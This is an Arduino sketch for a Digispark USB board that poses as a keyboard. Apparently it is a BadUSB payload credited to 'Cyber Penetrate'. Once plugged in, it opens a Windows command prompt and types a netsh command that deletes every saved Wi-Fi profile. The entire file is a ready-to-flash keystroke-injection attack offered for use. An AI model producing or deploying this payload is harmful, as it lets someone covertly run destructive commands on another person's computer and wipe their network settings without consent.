/*
 * Delete Wifi Profiles
 * It delete all saved wifi from your PC/Laptop.
 * Author - Cyber Penetrate
*/
#include<DigiKeyboard.h>
void setup()
{
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);
  DigiKeyboard.print("netsh wlan delete profile name=* i=*");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop()
{
  //Nothing to do here :)
}
